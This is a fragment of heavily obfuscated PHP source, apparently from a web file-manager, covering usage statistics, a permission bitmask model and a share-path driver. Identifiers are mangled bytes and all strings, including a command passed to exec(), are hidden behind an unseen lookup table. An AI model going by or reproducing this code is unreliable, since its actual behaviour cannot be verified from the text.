$ÇäªªëË[782] => (int) $ùœúÀ†Ï, $ÇäªªëË[1784] => (int) $ĞØ¶ÎŸ’, $ÇäªªëË[1785] => (int) $Ç†§ßŠ¡, $ÇäªªëË[1786] => (int) $üÑõÄî£); return $this->insert($æÂí©¡ú); } public function trend($ºøø³Ç¢, $ÙúÈ€ÆÖ) { $ı”ò¢µ =& $_SERVER[ä¿÷‹µ±]; if (!$this->init($ºøø³Ç¢)) { return !1; } $Åï¡Á—æ = $this->trendList($ºøø³Ç¢); if ($Åï¡Á—æ && $ÙúÈ€ÆÖ != $ı”ò¢µ[1651]) { $ªÀª  ² = $Åï¡Á—æ[0][$ı”ò¢µ[224]]; $òÕ´¡í« = $this->validDate($ÙúÈ€ÆÖ, $ªÀª  ²); $Ú˜˜ç® = array(); $½Ÿà·öÃ = array_to_keyvalue($Åï¡Á—æ, $ı”ò¢µ[224]); foreach ($òÕ´¡í« as $‹´É«Ã©) { if (isset($½Ÿà·öÃ[$‹´É«Ã©])) { $å‡™ô™õ = $½Ÿà·öÃ[$‹´É«Ã©]; } else { $å‡™ô™õ = end($Åï¡Á—æ); $å‡™ô™õ[$ı”ò¢µ[224]] = $‹´É«Ã©; if ($ºøø³Ç¢ == $ı”ò¢µ[600]) { $å‡™ô™õ[$ı”ò¢µ[1780]] = $å‡™ô™õ[$ı”ò¢µ[1781]] = 0; } } $Ú˜˜ç®[] = $å‡™ô™õ; } $Åï¡Á—æ = $Ú˜˜ç®; } $–Ö¬áŒ€ = array($ı”ò¢µ[600] => array($ı”ò¢µ[784] => LNG($ı”ò¢µ[1796]), $ı”ò¢µ[1780] => LNG($ı”ò¢µ[1797]), $ı”ò¢µ[1781] => LNG($ı”ò¢µ[1798])), $ı”ò¢µ[1782] => array($ı”ò¢µ[782] => LNG($ı”ò¢µ[1799]), $ı”ò¢µ[1784] => LNG($ı”ò¢µ[1800]), $ı”ò¢µ[1785] => LNG($ı”ò¢µ[1801]), $ı”ò¢µ[1786] => LNG($ı”ò¢µ[1802]))); $¦¯€ş¦ı = array($ı”ò¢µ[600] => $ı”ò¢µ[1803], $ı”ò¢µ[1782] => $ı”ò¢µ[76]); if (empty($Åï¡Á—æ)) { $‹´É«Ã© = date($ı”ò¢µ[1787], strtotime($ı”ò¢µ[1788])); $’ûŒüñ = array($ı”ò¢µ[224] => $‹´É«Ã©); foreach ($–Ö¬áŒ€[$ºøø³Ç¢] as $¢€ïßš => $ß„àùÙ„) { $’ûŒüñ[$¢€ïßš] = 0; } $Åï¡Á—æ[] = $’ûŒüñ; } $Ìï¢×»ï = array(); foreach ($Åï¡Á—æ as $ß„àùÙ„) { if ($ºøø³Ç¢ == $ı”ò¢µ[1782] && $ß„àùÙ„[$ı”ò¢µ[1784]] > $ß„àùÙ„[$ı”ò¢µ[782]]) { $ß„àùÙ„[$ı”ò¢µ[1784]] = $ß„àùÙ„[$ı”ò¢µ[782]]; } foreach ($–Ö¬áŒ€[$ºøø³Ç¢] as $¢€ïßš => $î·ÎÇÒ) { $å‡™ô™õ = array($ı”ò¢µ[224] => $ß„àùÙ„[$ı”ò¢µ[224]], $ı”ò¢µ[1576] => $î·ÎÇÒ); $å‡™ô™õ[$¦¯€ş¦ı[$ºøø³Ç¢]] = isset($ß„àùÙ„[$¢€ïßš]) ? $ß„àùÙ„[$¢€ïßš] : 0; $Ìï¢×»ï[] = $å‡™ô™õ; } } return $Ìï¢×»ï; } public function validDate($»ÓšİÈÎ, $Ş¢÷à¼‚) { $¹‘ˆ÷ú =& $_SERVER[ä¿÷‹µ±]; $æò¹å‡¨ = date($¹‘ˆ÷ú[1787], strtotime($¹‘ˆ÷ú[1788])); $‰²óç¼ä = array($æò¹å‡¨); switch ($»ÓšİÈÎ) { case $¹‘ˆ÷ú[1658]: $à»œŞõ¡ = mktime(0, 0, 0, date($¹‘ˆ÷ú[1804]), date($¹‘ˆ÷ú[1397]) - date($¹‘ˆ÷ú[1460]) + 7 - 7, date($¹‘ˆ÷ú[1805])); $Å¹Å©’® = 0; do { $çÍüĞÔ = date($¹‘ˆ÷ú[1787], $à»œŞõ¡ - 3600 * 24 * 7 * $Å¹Å©’®); $‰²óç¼ä[] = $çÍüĞÔ; $Å¹Å©’®++; } while ($Ş¢÷à¼‚ < $çÍüĞÔ); break; case $¹‘ˆ÷ú[1656]: $Å¹Å©’® = 1; do { $ªç°·Û½ = date($¹‘ˆ÷ú[1806], strtotime("\x2d\x20{$Å¹Å©’®}\40\155\157\156\x74\x68\163")); $‰²óç¼ä[] = $ªç°·Û½; $Å¹Å©’®++; } while ($Ş¢÷à¼‚ < $ªç°·Û½); break; case $¹‘ˆ÷ú[1807]: $ëƒÚ ½è = (int) date($¹‘ˆ÷ú[1805], strtotime($Ş¢÷à¼‚)); $±À¸©¿¤ = (int) date($¹‘ˆ÷ú[1805]); if ($ëƒÚ ½è >= $±À¸©¿¤) { break; } for ($ëƒÚ ½è; $ëƒÚ ½è < $±À¸©¿¤; $ëƒÚ ½è++) { $‰²óç¼ä[] = $ëƒÚ ½è . $¹‘ˆ÷ú[1808]; } break; default: break; } if ($Ş¢÷à¼‚ > end($‰²óç¼ä)) { array_pop($‰²óç¼ä); } sort($‰²óç¼ä); return $‰²óç¼ä; } public function listTable($×áÂÃû) { $¹ÄòÁÜ¥ = ucfirst($×áÂÃû); return Model($¹ÄòÁÜ¥)->listData(); } public function option($İçŞÓÂ™) { $ŸµÁÁè = $_SERVER[ä¿÷‹µ±][1809] . ucfirst($İçŞÓÂ™); return $this->{$ŸµÁÁè}(); } private function optionUser() { $Éº´¹Œ¨ =& $_SERVER[ä¿÷‹µ±]; $Æàˆñ = Model($Éº´¹Œ¨[535])->count($Éº´¹Œ¨[1678]); $…½“”‘ï = Model($Éº´¹Œ¨[535])->where($Éº´¹Œ¨[1810])->count($Éº´¹Œ¨[1678]); $Âì–‹º = intval($GLOBALS[$Éº´¹Œ¨[6]][$Éº´¹Œ¨[349]][$Éº´¹Œ¨[1633]]) / 3600; $Ş¢ÍğŠ = strtotime("\55{$Âì–‹º}\x20\150\x6f\165\162\x73"); $à“ÃÒûé = strtotime(date($Éº´¹Œ¨[1791])); if ($Ş¢ÍğŠ < $à“ÃÒûé) { $Ş¢ÍğŠ = $à“ÃÒûé; } $úªÅ‘ÅÎ = array($Éº´¹Œ¨[1811] => array($Éº´¹Œ¨[1036], $Ş¢ÍğŠ)); $÷Ğ®«ı = (int) Model($Éº´¹Œ¨[535])->where($úªÅ‘ÅÎ)->count($Éº´¹Œ¨[1678]); if (!$÷Ğ®«ı) { $÷Ğ®«ı = 1; } $úªÅ‘ÅÎ = array($Éº´¹Œ¨[1811] => array($Éº´¹Œ¨[1036], $à“ÃÒûé)); $Òí–÷ì¿ = Model($Éº´¹Œ¨[535])->where($úªÅ‘ÅÎ)->count($Éº´¹Œ¨[1678]); return array($Éº´¹Œ¨[778] => (int) $Æàˆñ, $Éº´¹Œ¨[1812] => (int) ($Æàˆñ - $…½“”‘ï), $Éº´¹Œ¨[1813] => (int) $…½“”‘ï, $Éº´¹Œ¨[1814] => (int) $Òí–÷ì¿, $Éº´¹Œ¨[1815] => $÷Ğ®«ı); } private function optionFile() { $Ã ±Ú² =& $_SERVER[ä¿÷‹µ±]; $ÃôÍÆŒÅ = $this->sourceSize(); $ŸâÜ•Á = $ÃôÍÆŒÅ[$Ã ±Ú²[76]]; $‰’ÀÏÔÌ = $ÃôÍÆŒÅ[$Ã ±Ú²[1784]]; $öƒâê ” = Model($Ã ±Ú²[844])->where(array($Ã ±Ú²[410] => 0))->count($Ã ±Ú²[402]); $ ŒÂİ™ = array($Ã ±Ú²[410] => 0, $Ã ±Ú²[200] => array($Ã ±Ú²[1036], strtotime(date($Ã ±Ú²[1791])))); $Ü¾ˆªÌÀ = Model($Ã ±Ú²[844])->where($ ŒÂİ™)->sum($Ã ±Ú²[76]); $®Ì„›Œ½ = Model($Ã ±Ú²[844])->where($ ŒÂİ™)->count($Ã ±Ú²[402]); return array($Ã ±Ú²[782] => $ŸâÜ•Á, $Ã ±Ú²[1784] => $‰’ÀÏÔÌ, $Ã ±Ú²[1816] => $ŸâÜ•Á - $‰’ÀÏÔÌ, $Ã ±Ú²[1817] => (int) $Ü¾ˆªÌÀ, $Ã ±Ú²[784] => (int) $öƒâê ”, $Ã ±Ú²[1818] => (int) $®Ì„›Œ½); } private function optionAccess() { $ƒÎ¦ùæ =& $_SERVER[ä¿÷‹µ±]; return array($ƒÎ¦ùæ[778] => $this->typeLogCnt(), $ƒÎ¦ùæ[107] => $this->typeLogCnt($ƒÎ¦ùæ[107]), $ƒÎ¦ùæ[452] => $this->typeLogCnt($ƒÎ¦ùæ[452]), $ƒÎ¦ùæ[1819] => $this->typeLogCnt($ƒÎ¦ùæ[1819]), $ƒÎ¦ùæ[1820] => $this->typeLogCnt($ƒÎ¦ùæ[1820]), $ƒÎ¦ùæ[600] => $this->typeLogCnt($ƒÎ¦ùæ[12], $ƒÎ¦ùæ[1795])); } private function typeLogCnt($šÀ™± = '', $û²ÂÁ¨š = "\x69\x64") { $”ô€·È =& $_SERVER[ä¿÷‹µ±]; $êº¼É¬ì = array($”ô€·È[107] => array($”ô€·È[1821], $”ô€·È[1822]), $”ô€·È[452] => array($”ô€·È[1823], $”ô€·È[1824]), $”ô€·È[1819] => array($”ô€·È[1825], $”ô€·È[1826], $”ô€·È[1827]), $”ô€·È[1820] => array($”ô€·È[1828], $”ô€·È[1829]), $”ô€·È[1830] => array($”ô€·È[1831], $”ô€·È[1832], $”ô€·È[1833])); $©€¹ïâ = strtotime(date($”ô€·È[1791])); $¿ü¹Û†à = array($”ô€·È[200] => array($”ô€·È[1036], $©€¹ïâ)); if ($šÀ™±) { $¿ü¹Û†à[$”ô€·È[33]] = array($”ô€·È[7], $êº¼É¬ì[$šÀ™±]); } $ŒñªÀ›å = Model($”ô€·È[1794])->where($¿ü¹Û†à)->count($û²ÂÁ¨š); return (int) $ŒñªÀ›å; } private function optionServer() { $şØŠÁª =& $_SERVER[ä¿÷‹µ±]; $˜´ø¾Å = $this->diskDriver(); $ÉÔôÃÀ† = KodIO::defaultDriver(); $½Éª¾ = array($şØŠÁª[836] => $ÉÔôÃÀ†[$şØŠÁª[399]]); $¤é÷ôÔ = Model($şØŠÁª[471])->where($½Éª¾)->sum($şØŠÁª[76]); $‹­Ù†‰Ğ = explode($şØŠÁª[53], $_SERVER[$şØŠÁª[143]]); $ÕŞ«Â = $‹­Ù†‰Ğ[0]; $Æ Î·ûÙ = $GLOBALS[$şØŠÁª[6]][$şØŠÁª[21]]; $×º˜¦ı = $Æ Î·ûÙ[$şØŠÁª[998]]; if ($×º˜¦ı == $şØŠÁª[986]) { $Î£ì¼Ú = explode($şØŠÁª[1294], $Æ Î·ûÙ[$şØŠÁª[997]]); $×º˜¦ı = $Î£ì¼Ú[0]; } if ($×º˜¦ı == $şØŠÁª[932] || $×º˜¦ı == $şØŠÁª[823]) { $ˆÕ»Äš = Model()->db()->query($şØŠÁª[1834]); $çˆ¬¦õë = $ˆÕ»Äš[0] && isset($ˆÕ»Äš[0][$şØŠÁª[1575]]) ? $ˆÕ»Äš[0][$şØŠÁª[1575]] : 0; $×º˜¦ı = $şØŠÁª[1835] . ($çˆ¬¦õë ? $şØŠÁª[8] . $çˆ¬¦õë : $şØŠÁª[12]); } $ú«’„¢ = $GLOBALS[$şØŠÁª[6]][$şØŠÁª[349]][$şØŠÁª[846]]; return array($şØŠÁª[1836] => $˜´ø¾Å ? $˜´ø¾Å[$şØŠÁª[1837]] : 0, $şØŠÁª[1838] => $˜´ø¾Å ? $˜´ø¾Å[$şØŠÁª[1839]] : 0, $şØŠÁª[1840] => (int) $ÉÔôÃÀ†[$şØŠÁª[1837]] * 1024 * 1024 * 1024, $şØŠÁª[1841] => (int) $¤é÷ôÔ, $şØŠÁª[1842] => ucfirst($ÕŞ«Â), $şØŠÁª[1843] => $şØŠÁª[1844] . PHP_VERSION, $şØŠÁª[1845] => phpBuild64() ? 64 : 32, $şØŠÁª[777] => str_replace($şØŠÁª[1152], $şØŠÁª[1014], $×º˜¦ı), $şØŠÁª[349] => ucfirst($ú«’„¢), $şØŠÁª[32] => $_SERVER[$şØŠÁª[1846]]); } private function diskDriver() { $ÆÈ»äŠê =& $_SERVER[ä¿÷‹µ±]; $¦óËæ¸ = $ÆÈ»äŠê[8]; $–¡Ş¹¢Ÿ = $GLOBALS[$ÆÈ»äŠê[6]][$ÆÈ»äŠê[1310]] == $ÆÈ»äŠê[1311]; if ($–¡Ş¹¢Ÿ) { $¦óËæ¸ = $ÆÈ»äŠê[1847]; if (function_exists($ÆÈ»äŠê[1848])) { exec($ÆÈ»äŠê[1849], $˜»¢¢Ò¾); $¦óËæ¸ = $˜»¢¢Ò¾[1] . $ÆÈ»äŠê[8]; } } if (!file_exists($¦óËæ¸)) { return; } $Ø¡–šÊñ = @disk_total_space($¦óËæ¸); $¤öèùİª = $Ø¡–šÊñ - @disk_free_space($¦óËæ¸); return array($ÆÈ»äŠê[1837] => $Ø¡–šÊñ, $ÆÈ»äŠê[1839] => $¤öèùİª); } public function fileChart($Ùó¦˜÷) { $ƒß¬óâÈ =& $_SERVER[ä¿÷‹µ±]; if (isset($Ùó¦˜÷[$ƒß¬óâÈ[1678]])) { return Model($ƒß¬óâÈ[844])->userFileTypeProfile($Ùó¦˜÷[$ƒß¬óâÈ[1678]]); } if (isset($Ùó¦˜÷[$ƒß¬óâÈ[1850]])) { return Model($ƒß¬óâÈ[844])->groupFileTypeProfile($Ùó¦˜÷[$ƒß¬óâÈ[1850]]); } $òŞÒÙ´¨ = $this->sourceSize(); $’€Î‰‚á = array($ƒß¬óâÈ[432] => 0, $ƒß¬óâÈ[411] => 1); $û•ãéÂô = Model($ƒß¬óâÈ[844])->where($’€Î‰‚á)->sum($ƒß¬óâÈ[76]); $’€Î‰‚á[$ƒß¬óâÈ[411]] = 2; $Î¿İ•ŞÃ = Model($ƒß¬óâÈ[844])->where($’€Î‰‚á)->sum($ƒß¬óâÈ[76]); return array($ƒß¬óâÈ[782] => $òŞÒÙ´¨[$ƒß¬óâÈ[76]], $ƒß¬óâÈ[1784] => $òŞÒÙ´¨[$ƒß¬óâÈ[1784]], $ƒß¬óâÈ[1785] => (int) $û•ãéÂô, $ƒß¬óâÈ[1786] => (int) $Î¿İ•ŞÃ); } private function sourceSize() { $ºÅ©·× =& $_SERVER[ä¿÷‹µ±]; $çú˜¶Ê = Model($ºÅ©·×[844])->where(array($ºÅ©·×[410] => 0))->sum($ºÅ©·×[76]); $ãİšòµ = Model($ºÅ©·×[471])->sum($ºÅ©·×[76]); if ($ãİšòµ > $çú˜¶Ê) { $ãİšòµ = $çú˜¶Ê; } return array($ºÅ©·×[76] => (int) $çú˜¶Ê, $ºÅ©·×[1784] => (int) $ãİšòµ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $„ı´›¸² =& $_SERVER[ä¿÷‹µ±]; $éì–ÙÁâ = array(array($„ı´›¸²[420] => LNG($„ı´›¸²[1851]), $„ı´›¸²[1852] => $„ı´›¸²[1853], $„ı´›¸²[1854] => 1, $„ı´›¸²[1855] => 1, $„ı´›¸²[1856] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($„ı´›¸²[420] => LNG($„ı´›¸²[1857]), $„ı´›¸²[1852] => $„ı´›¸²[1858], $„ı´›¸²[1854] => 2, $„ı´›¸²[1855] => 1, $„ı´›¸²[1856] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($„ı´›¸²[420] => LNG($„ı´›¸²[1859]), $„ı´›¸²[1852] => $„ı´›¸²[1860], $„ı´›¸²[1854] => 3, $„ı´›¸²[1855] => 1, $„ı´›¸²[1856] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($„ı´›¸²[420] => LNG($„ı´›¸²[1861]), $„ı´›¸²[1852] => $„ı´›¸²[1862], $„ı´›¸²[1854] => 4, $„ı´›¸²[1855] => 1, $„ı´›¸²[1856] => self::AUTH_SHOW | self::AUTH_VIEW), array($„ı´›¸²[420] => LNG($„ı´›¸²[1863]), $„ı´›¸²[1852] => $„ı´›¸²[1864], $„ı´›¸²[1854] => 5, $„ı´›¸²[1855] => 1, $„ı´›¸²[1856] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($„ı´›¸²[420] => LNG($„ı´›¸²[1865]), $„ı´›¸²[1852] => $„ı´›¸²[1866], $„ı´›¸²[1854] => 6, $„ı´›¸²[1855] => 1, $„ı´›¸²[1856] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($„ı´›¸²[420] => LNG($„ı´›¸²[1867]), $„ı´›¸²[1852] => $„ı´›¸²[1868], $„ı´›¸²[1854] => 7, $„ı´›¸²[1855] => 1, $„ı´›¸²[1856] => 0)); return $éì–ÙÁâ; } public static function authCheck($Êæ¾ÏÓİ, $è›°”…³) { $¦Úù´Ğ… =& $_SERVER[ä¿÷‹µ±]; $Êæ¾ÏÓİ = intval($Êæ¾ÏÓİ); if ($GLOBALS[$¦Úù´Ğ…[503]] && $GLOBALS[$¦Úù´Ğ…[6]][$¦Úù´Ğ…[1869]]) { return !0; } if ($Êæ¾ÏÓİ <= 0) { return !1; } if (($Êæ¾ÏÓİ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Êæ¾ÏÓİ & $è›°”…³); } public static function authCheckShow($°í´è) { return self::authCheck($°í´è, self::AUTH_SHOW); } public static function authCheckView($Û›ƒÔîî) { return self::authCheck($Û›ƒÔîî, self::AUTH_VIEW); } public static function authCheckDownload($ç¯¹†ì) { return self::authCheck($ç¯¹†ì, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¶êÑƒ”Ş) { return self::authCheck($¶êÑƒ”Ş, self::AUTH_UPLOAD); } public static function authCheckEdit($û“ğõ”) { return self::authCheck($û“ğõ”, self::AUTH_EDIT); } public static function authCheckRemove($öşë¯¹ı) { return self::authCheck($öşë¯¹ı, self::AUTH_REMOVE); } public static function authCheckShare($Òš˜†š) { return self::authCheck($Òš˜†š, self::AUTH_SHARE); } public static function authCheckComment($Ÿ–ÜÌ²) { return self::authCheck($Ÿ–ÜÌ², self::AUTH_COMMENT); } public static function authCheckEvent($™’ÇçÑ) { return self::authCheck($™’ÇçÑ, self::AUTH_EVENT); } public static function authCheckRoot($¬Ğ“¶ä›) { return self::authCheck($¬Ğ“¶ä›, self::AUTH_ROOT); } public static function authCheckAction($÷¼ï”í•, $Çº–ÅÆ–) { $ÉºŸÏš =& $_SERVER[ä¿÷‹µ±]; $ê·ıŞú¡ = array($ÉºŸÏš[1870] => self::AUTH_VIEW, $ÉºŸÏš[1221] => self::AUTH_DOWNLOAD, $ÉºŸÏš[107] => self::AUTH_UPLOAD, $ÉºŸÏš[1820] => self::AUTH_EDIT, $ÉºŸÏš[1819] => self::AUTH_REMOVE, $ÉºŸÏš[1830] => self::AUTH_SHARE, $ÉºŸÏš[354] => self::AUTH_COMMENT, $ÉºŸÏš[1666] => self::AUTH_EVENT, $ÉºŸÏš[1871] => self::AUTH_ROOT); if (!isset($ê·ıŞú¡[$Çº–ÅÆ–])) { return; } $ÁÎÊ’öô = $ê·ıŞú¡[$Çº–ÅÆ–]; $÷¼ï”í• = intval($÷¼ï”í•); if ($÷¼ï”í• <= 0) { return !1; } if (($÷¼ï”í• & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($÷¼ï”í• & $ÁÎÊ’öô); } public static function authDisable($ïç‚¢ÃÃ, $Ó”îùÉÂ) { if (intval($ïç‚¢ÃÃ) <= 0) { return 0; } return intval($ïç‚¢ÃÃ) & ~$Ó”îùÉÂ; } public $optionType = "\x53\x79\163\x74\x65\155\56\163\157\165\x72\143\x65\101\x75\x74\x68\x4c\x69\x73\x74"; public $field = array("\156\141\155\145", "\141\x75\164\150", "\154\x61\142\145\154", "\x64\x69\x73\160\x6c\x61\x79", "\163\171\x73\164\145\x6d", "\163\x6f\162\x74"); public function initData() { $èü¸¤½Å = $this->authDefault(); foreach ($èü¸¤½Å as $Â£¢Û¢Ÿ) { $this->add($Â£¢Û¢Ÿ); } } public function findAuth($ëÒ¤«‰ú, $™Ë©ª˜Â) { $²Ï¢ø =& $_SERVER[ä¿÷‹µ±]; $áÓşÓı = parent::listData(); foreach ($áÓşÓı as $ƒù·û”¼) { $ğÏşıµü = intval($ƒù·û”¼[$²Ï¢ø[413]]); if ($ğÏşıµü <= 0 || $ƒù·û”¼[$²Ï¢ø[1872]] == 0) { continue; } if (($ğÏşıµü & $ëÒ¤«‰ú) != $ëÒ¤«‰ú) { continue; } if (($ğÏşıµü & $™Ë©ª˜Â) != 0) { continue; } return $ƒù·û”¼[$²Ï¢ø[399]]; } return !1; } public function findAuthReadOnly() { $€Šœ¼£ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ ššÀ¡‹ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($€Šœ¼£, $ ššÀ¡‹); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $‚‘˜ÖÉÂ =& $_SERVER[ä¿÷‹µ±]; $¿¾‡‹à = parent::listData(); $¹¾Úì±† = !1; foreach ($¿¾‡‹à as $Üö€ô÷œ) { if ($Üö€ô÷œ[$‚‘˜ÖÉÂ[413]] <= 0 || $Üö€ô÷œ[$‚‘˜ÖÉÂ[1872]] == $‚‘˜ÖÉÂ[197]) { continue; } if (!$¹¾Úì±†) { $¹¾Úì±† = $Üö€ô÷œ; continue; } if ($¹¾Úì±†[$‚‘˜ÖÉÂ[413]] > $Üö€ô÷œ[$‚‘˜ÖÉÂ[413]]) { $¹¾Úì±† = $Üö€ô÷œ; } } return $¹¾Úì±† ? $¹¾Úì±†[$‚‘˜ÖÉÂ[399]] : $‚‘˜ÖÉÂ[12]; } public function listData($¨ŠÏáÈ = false, $ÂÙÃÁ¯ = "\x73\x6f\x72\164", $ä½Â±ëó = false) { return parent::listData($¨ŠÏáÈ, $ÂÙÃÁ¯, $ä½Â±ëó); } public function update($îñ—Ë“, $øıüéâ•) { $¦„Ü÷ó =& $_SERVER[ä¿÷‹µ±]; $÷‘­ã®¡ = parent::listData($îñ—Ë“); $ƒŸŠƒ™× = $this->findByName($øıüéâ•[$¦„Ü÷ó[32]]); if (!$÷‘­ã®¡ || $ƒŸŠƒ™× && $ƒŸŠƒ™×[$¦„Ü÷ó[399]] != $÷‘­ã®¡[$¦„Ü÷ó[399]]) { return !1; } $this->filterAuth($øıüéâ•[$¦„Ü÷ó[413]]); return parent::update($îñ—Ë“, $øıüéâ•); } public function remove($ã¹Şş×Ê) { $¾Îú‚áŸ = parent::listData($ã¹Şş×Ê); if (!$¾Îú‚áŸ || $¾Îú‚áŸ[$_SERVER[ä¿÷‹µ±][1298]]) { return !1; } return parent::remove($ã¹Şş×Ê); } public function add($Ğ›¼õš¤ = array()) { $°‰å¦àİ =& $_SERVER[ä¿÷‹µ±]; if ($this->findByName($Ğ›¼õš¤[$°‰å¦àİ[32]])) { return !1; } $“¸àø–­ = array($°‰å¦àİ[32] => $°‰å¦àİ[12], $°‰å¦àİ[413] => 1, $°‰å¦àİ[1873] => $°‰å¦àİ[1860], $°‰å¦àİ[1872] => 1, $°‰å¦àİ[1298] => 0, $°‰å¦àİ[1874] => 0); $Ğ›¼õš¤ = array_merge($“¸àø–­, $Ğ›¼õš¤); $Ğ›¼õš¤[$°‰å¦àİ[1874]] = $this->getSort(); $this->filterAuth($Ğ›¼õš¤[$°‰å¦àİ[413]]); return parent::insert($Ğ›¼õš¤); } private function getSort() { $–¸ó¡å =& $_SERVER[ä¿÷‹µ±]; $‚Œ´¬ºË = parent::listData(); $äÜÕÈİ = array_to_keyvalue($‚Œ´¬ºË, $–¸ó¡å[12], $–¸ó¡å[1874]); return empty($äÜÕÈİ) ? 0 : max($äÜÕÈİ) + 1; } private function filterAuth(&$™ÑÔƒ¿å) { if (!$™ÑÔƒ¿å) { return; } $˜ä­§ªş = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $— ‘ó§ä = array(); foreach ($˜ä­§ªş as $’Ä¦Ùß§) { if ($™ÑÔƒ¿å & $’Ä¦Ùß§) { $— ‘ó§ä[] = $’Ä¦Ùß§; } } if (in_array(self::AUTH_ROOT, $— ‘ó§ä)) { $™ÑÔƒ¿å = array_sum($˜ä­§ªş); return; } $å¶°úç = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($— ‘ó§ä as $’Ä¦Ùß§) { if (isset($å¶°úç[$’Ä¦Ùß§])) { $— ‘ó§ä = array_merge($— ‘ó§ä, $å¶°úç[$’Ä¦Ùß§]); } } $— ‘ó§ä[] = self::AUTH_SHOW; $™ÑÔƒ¿å = array_sum(array_unique($— ‘ó§ä)); } public function sort($¬¸ø•åé, $ƒ¤½äî¢) { return parent::update($¬¸ø•åé, $ƒ¤½äî¢); } } $_file = $_SERVER[$_SERVER[ä¿÷‹µ±][934]]; goto cøÀÀîšÖ; b­ïí·ÁÃğ: class PathDriverDriverShareItem { public function __construct($áé§Ä”Å) { $this->pathParse = $áé§Ä”Å; } public function __call($Ú•®˜½Ê, $Ä–¢çë) { $š´Çİ·‰ =& $_SERVER[ä¿÷‹µ±]; if (method_exists($this, $Ú•®˜½Ê)) { return; } $ãâÏ„ = call_user_func_array(array($š´Çİ·‰[1359], $Ú•®˜½Ê), $Ä–¢çë); $¢¾ó‚ó½ = array($š´Çİ·‰[1360], $š´Çİ·‰[1361], $š´Çİ·‰[1362], $š´Çİ·‰[1363], $š´Çİ·‰[555], $š´Çİ·‰[557], $š´Çİ·‰[1364], $š´Çİ·‰[107], $š´Çİ·‰[1365], $š´Çİ·‰[1366]); if (in_array($Ú•®˜½Ê, $¢¾ó‚ó½)) { $ãâÏ„ = $this->getPathOuter($ãâÏ„); } return $ãâÏ„; } public function copy($ÜËÓíï¼, $ç¦êœŒ´, $æŞ¦×İ‘ = false, $º“æ›‘ß = false) { return $this->copyMove($ÜËÓíï¼, $ç¦êœŒ´, $æŞ¦×İ‘, $_SERVER[ä¿÷‹µ±][555], $º“æ›‘ß); } public function move($˜¨óß£§, $ÎÂ¼îÌì, $Ü¦†ªÏ = false, $†½ã¾˜ç = false) { return $this->copyMove($˜¨óß£§, $ÎÂ¼îÌì, $Ü¦†ªÏ, $_SERVER[ä¿÷‹µ±][557], $†½ã¾˜ç); } private function copyMove($­÷­è‰‡, $¸Îœå², $­ä®Á³×, $—ìÃÁ½, $ûíÕíÁ“ = false) { $‰¬‚÷Í =& $_SERVER[ä¿÷‹µ±]; $æÆšñ¤š = $¸Îœå²; $¡ÊÉË = IO::driverMake($¸Îœå²); if ($¡ÊÉË->pathParse[$‰¬‚÷Í[1173]]) { $¸Îœå² = $¡ÊÉË->pathParse[$‰¬‚÷Í[1173]]; } else { $¸Îœå² = $æÆšñ¤š; } $·“¹…èÄ = IO::copyMove($­÷­è‰‡, $¸Îœå², $­ä®Á³×, $—ìÃÁ½, $ûíÕíÁ“); $·“¹…èÄ = $this->getPathOuter($·“¹…èÄ); return $·“¹…èÄ; } public function pathThis($ŸÕ†Î å) { return get_path_this($this->pathParse[$_SERVER[ä¿÷‹µ±][84]]); } public function pathFather($İ§ûã„º) { return get_path_father($this->pathParse[$_SERVER[ä¿÷‹µ±][84]]); } public function iconvSystem($¿öÛÜ¶¥) { return $¿öÛÜ¶¥; } protected function infoParse($İ¤¾×›¡, $å“ü“Á = false) { $§¸ÎÑ®¯ =& $_SERVER[ä¿÷‹µ±]; $®‰Åœµ‘ = $this->pathParse[$§¸ÎÑ®¯[487]][$§¸ÎÑ®¯[1198]] . $this->pathParse[$§¸ÎÑ®¯[1191]]; if ($å“ü“Á) { $ŒËíµ§‡ = IO::infoWithChildren($®‰Åœµ‘); } else { $ŒËíµ§‡ = IO::info($®‰Åœµ‘); } $òöÃşØ¡ = $this->pathParse[$§¸ÎÑ®¯[487]]; return Action($§¸ÎÑ®¯[1357])->_shareItemeParse($ŒËíµ§‡, $òöÃşØ¡); } public function 